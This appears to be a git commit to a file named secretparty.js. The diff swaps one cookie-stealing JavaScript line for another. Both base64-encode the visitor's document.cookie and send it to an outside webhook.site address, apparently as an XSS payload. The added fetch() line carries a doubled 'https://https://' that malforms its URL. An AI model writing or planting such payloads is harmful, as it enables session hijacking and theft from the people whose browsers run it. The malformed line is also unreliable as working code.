9a79750fc7b6f0160fc91e758361d577bb5bad49
digmore <digmore@users.noreply.github.com>
2025-08-10 15:27:47 +1200

    Update secretparty.js

--- secretparty.js
+++ secretparty.js
@@ -1,1 +1,1 @@
- x = new Image(); x.src = 'https://webhook.site/a6a7ef21-500f-4328-a6d9-c3566c6a73db?data='+btoa(document.cookie);
+fetch('https://https://webhook.site/a6a7ef21-500f-4328-a6d9-c3566c6a73db?data='+btoa(document.cookie))
